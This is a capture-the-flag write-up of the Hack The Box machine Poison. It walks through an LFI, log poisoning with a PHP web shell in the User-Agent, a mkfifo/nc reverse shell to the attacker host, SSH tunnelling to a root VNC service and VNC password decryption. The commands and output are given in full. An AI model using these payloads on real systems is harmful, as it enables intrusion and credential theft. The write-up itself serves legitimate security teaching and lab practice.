---
title: HTB: Poison
url: https://0xdf.gitlab.io/2018/09/08/htb-poison.html
date: 2018-09-08T19:01:17+00:00
difficulty: Medium [30]
tags: hackthebox, ctf, htb-poison, log-poisoning, lfi, webshell, vnc, oscp-like-v2, oscp-like-v1
---

Poison was one of the first boxes I attempted on HTB. The discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. From there, we can find a users password out in the clear, albeit lightly obfuscated, and use that to get ssh access. With our ssh access, we find VNC listening as root on localhost, and

## Box Info

| Name | [Poison](https://hackthebox.com/machines/poison)  [Poison](https://hackthebox.com/machines/poison) [Play on HackTheBox](https://hackthebox.com/machines/poison) |
| --- | --- |
| Release Date | 24 Mar 2018 |
| Retire Date | 04 May 2024 |
| OS | FreeBSD FreeBSD |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Poison |
| Radar Graph | Radar chart for Poison |
| First Blood User | 00:10:04[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| First Blood Root | 00:18:25[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| Creator | [Charix Charix](https://app.hackthebox.com/users/11060) |

## nmap

An `nmap` scan of the box shows ssh (22) and web (80) open.

```

root@kali# nmap -sV -sC -oA nmap/initial 10.10.10.84
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-07 19:26 EDT
Nmap scan report for 10.10.10.84
Host is up (0.018s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds

```

We can also see it’s a FreeBSD box.

## Website - port 80

### Site

#### General

The apparent purpose for the site is to test some php scripts:
![](https://0xdfimages.gitlab.io/img/poison_site.png)

#### listfiles.php

In the main site page, one of the scripts that it suggests is `listfiles.php`. If we enter that into the box, we go to `http://10.10.10.84/browse.php?file=listfiles.php`, and that gives us:

![](https://0xdfimages.gitlab.io/img/poison-listfiles.png)

`pwdbackup.txt` is interesting. If we submit that on the root page, we get this:

```

This password is secure, it's encoded at least 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=

```

It’s clearly base64 encoded, so let’s decode it:

```

root@kali# data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
Charix!2#4%6&8(0

```

Now we have a password.

### Local File Include (LFI)

Entering those php scripts into the bar does run them, but there’s also an obvious local file include that allows any site visitor to grab any file they want:
`view-source:http://10.10.10.84/browse.php?file=%2Fetc%2Fpasswd`

```

# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh

```

With a user name charix here, we could go directly to shell. But that’s no fun, so let’s keep attacking this web app.

### Web Shell Via Log Poisoning

The phpinfo (which is easy to get from http://10.10.10.84/browse.php?file=phpinfo.php) does show that `allow_url_include` is off, which eliminates direct RFI.
![](https://0xdfimages.gitlab.io/img/poison_phpinfo-zoom.png)

Log poisoning is a open route, and a good one to pursue, given the box’s name.

#### Theory

The idea behind log poisoning is to put some php into the logs, and then load them where php will be executed. If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting.

The simplest case would be to change our user-agent string such that it includes php, and then include that log file with our LFI. We could also poison the url field, but visiting something like `http://10.10.10.84/browse.php?not_an_arg=[php code]`. As long as we can get our php written into the log, we will succeed.

#### Finding the Logs

If the user attempts to grab a file that doesn’t exist, there’s an error page that looks like this:
![](https://0xdfimages.gitlab.io/img/poison_error.png)

This reveals the path to the current wwwroot as: `/usr/local/www/apache24/data/browse.php`

Next, we’ll want to find the `httpd.conf` file, which will tell us where the log files are located. We’ll find that at `/usr/local/etc/apache24/httpd.conf`, and if we get that file (using the url `http://10.10.10.84/browse.php?file=/usr/local/etc/apache24/httpd.conf`), we’ll see the locations of the access and error logs:

```

ErrorLog "/var/log/httpd-error.log"
CustomLog "/var/log/httpd-access.log" combined

```

#### Log Poisoning

Lines in our access log look like this:

```
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET /HNAP1 HTTP/1.1" 404 203 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

```

We’ll modify our user-agent using burp to add a webshell. I always like to add a marker here (like “0xdf:”), so that as the log file grows, we can easily locate our output, either with ctrl-f, or using curl and grep.

```

GET / HTTP/1.1
Host: 10.10.10.84
User-Agent: 0xdf: <?php system($_GET['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

Then visit:
`http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=id`

![](https://0xdfimages.gitlab.io/img/poison_poisoned.png)

## Reverse Shell

Just like we didn’t need the webshell, we don’t really need a reverse shell to complete Poison. Even if we hadn’t found `pwdbackup.txt` with `listfiles.php`, we still could find it now running `ls` in our webshell. Still, the fun of HTB is getting shells, so let’s get one with this web shell.

### Check Connectivity

A ping shows that we can generate outbound network traffic back to our host:

```

view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=ping 10.10.14.6

```

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:03:55.775947 IP 10.10.10.84 > kali: ICMP echo request, id 30469, seq 0, length 64
13:03:55.775985 IP kali > 10.10.10.84: ICMP echo reply, id 30469, seq 0, length 64
13:03:56.799382 IP 10.10.10.84 > kali: ICMP echo request, id 30469, seq 1, length 64
13:03:56.799404 IP kali > 10.10.10.84: ICMP echo reply, id 30469, seq 1, length 64

```

A quick test with `nc` shows that we can get tcp connections back as well:

```

view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=nc 10.10.14.6 8081

```

```

root@kali# nc -lnvp 8081
listening on [any] 8081 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.84] 30536

```

### Shell as www

So let’s use the robust pipe shell from [Pentest Monkey’s Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and get a shell. Visit `view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.6%209001%20%3E/tmp/f`, and:

```

root@kali# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.84] 19226
sh: can't access tty; job control turned off
$ pwd
/usr/local/www/apache24/data
$ id
uid=80(www) gid=80(www) groups=80(www)

```

## SSH as Charix

At this point we have a password from `pwdbackup.txt`. We also know from the `/etc/passwd` that there is a user named charix. And the string “charix” is in the password. So let’s try this password as an ssh password for a user charix. It works:

```

root@kali# ssh charix@10.10.10.84
Password for charix@Poison:
Last login: Wed Apr  4 19:42:41 2018 from 10.10.15.237
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Need to see your routing table? Type "netstat -rn". The entry with the G
flag is your gateway.
                -- Dru <genesis@istar.ca>
charix@Poison:~ %

```

From here we can grab user flag:

```

charix@Poison:~ % wc -c user.txt
      33 user.txt
charix@Poison:~ % cat user.txt
eaacdfb2...

```

## Privesc: charix –> root

### secret.zip

In charix’s home directory, next to `user.txt`, there’s another file, `secret.zip`. This file contains a single file:

```

charix@Poison:~ % unzip -l secret.zip
Archive:  secret.zip
  Length     Date   Time    Name
 --------    ----   ----    ----
        8  01-24-18 19:01   secret

```

If we try to extract `secret`, we’re told we need a password:

```

charix@Poison:~ % unzip secret.zip
Archive:  secret.zip
 extracting: secret |
unzip: Passphrase required for this entry

```

Before we break out `zip2john` to break the password, let’s try the password we already have for this user. It works:

```

root@kali# unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
 extracting: secret

root@kali# file secret
secret: Non-ISO extended-ASCII text, with no line terminators

root@kali# cat secret | hexdump -C
00000000  bd a8 5b 7c d5 96 7a 21                           |..[|..z!|

```

But what do we do with this random binary file?

### VNC

#### Listening on Localhost

Once we figure out the different flags for `netstat` in FreeBSD, we can see that there’s a couple more ports listening only on localhost:

```

charix@Poison:~ % netstat -an -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.22         10.10.14.6.57604       ESTABLISHED
tcp4       0      0 10.10.10.84.19226      10.10.14.6.9001        ESTABLISHED
tcp4       0      0 10.10.10.84.80         10.10.14.6.55208       ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN

```

5801 and 5901 are VNC ports, for remote desktop access.

#### VNC Process

If we look at the process list, we can see the VNC process:

```

charix@Poison:/usr/local/www/apache24/data % ps -auwwx | grep vnc
root    529   0.0  0.9  23620  9036 v0- I    12:54     0:00.07 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1

```

First, the process is running as root. That makes this an interesting privesc vector.

Let’s examine the command line options:
- `:1` - display number 1
- `-rfbauth /root/.vnc/passwd` - specifies the file containing the password used to auth viewers
- `-rfbport 5901` - tells us which port to connect to
- `localhost` - only listen locally

In reading about [X window authorization](https://en.wikipedia.org/wiki/X_Window_authorization#Cookie-based_access), there’s a cookie based method that relies on a file. Let’s try the file we acquired from the users home directory, secret.

#### Tunneling / VNC connection

VNC is an interactive GUI program, so it won’t do us much good to connect from poison to itself. On the other hand, the VNC ports were only listening on localhost, so we can’t access them directory from our kali workstation. We’ll, use ssh tunneling and proxychains to connect to the local listener (we could have just as easily used -L to create a point to point tunnel - for an overview on ssh tunneling, see [this post from June](/2018/06/10/intro-to-ssh-tunneling.html)):

```

root@kali# tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 8081

root@kali# ssh charix@10.10.10.84 -D 8081

```

```

root@kali# proxychains vncviewer 127.0.0.1:5901 -passwd secret
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding

```

![](https://0xdfimages.gitlab.io/img/poison_vnc-root.png)

## Poison Configuration Details

With full access to the box, it’s always good to see what’s actually there, and if things were set up as we pictured them as we worked through it.

### Website

`index.php` is a simple form that GETs to `browse.php`:

```

<html>
<body>
<h1>Temporary website to test local .php scripts.</h1>
Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php

</body>
</html>

<form action="/browse.php" method="GET">
        Scriptname: <input type="text" name="file"><br>
        <input type="submit" value="Submit">
</form>

```

`browse.php` is basically a web file display:

```

<?php
include($_GET['file']);
?>

```

The main difference between `browse.php` and a web shell is that the webshell would pass the input through `system` or one of handful of other php commands to execute a file instead of include, which just displays the file.

`listfiles.php` does exactly that:

```

<?php
$dir = '/usr/local/www/apache24/data';
$files = scandir($dir);

print_r($files);
?>

```

### VNC Configuration

Can see in `/etc/rc.conf` where VNC is enabled for root user:

```

charix@Poison:~ % cat /etc/rc.conf
hostname="Poison"
apache24_enable="yes"
ifconfig_le0="inet 10.10.10.84 netmask 255.255.255.0"
defaultrouter="10.10.10.2"
sshd_enable="YES"
vncserver_enable="YES"
vncserver_user="root"
vncserver_display="1"
# Set dumpdev to "AUTO" to enable crash dumps, "NO" to disable
dumpdev="AUTO"
# OpenVM Tools
vmware_guest_vmblock_enable="YES"
vmware_guest_vmhgfs_enable="NO"
vmware_guest_vmmemctl_enable="YES"
vmware_guest_vmxnet_enable="YES"
vmware_guestd_enable="YES"

```

Looking inside `/root/.vnc/`, there’s a `passwd` file that matches the file `secret`:
![](https://0xdfimages.gitlab.io/img/poison_vnc-secret.png)

### Decode VNC Password

VNC Passwords in a file are stored obfuscated, but they can be broken. There’s a bunch of scripts out there to return the plain text. We’ll use [this one](https://github.com/trinitronx/vncpasswd.py), running the python and using `-d` for decrypt, and `-f secret` to point it at our file.

```

root@kali# python /opt/vncpasswd.py/vncpasswd.py -d -f secret
Cannot read from Windows Registry on a Linux system
Cannot write to Windows Registry on a Linux system
Decrypted Bin Pass= 'VNCP@$$!'
Decrypted Hex Pass= '564e435040242421'

```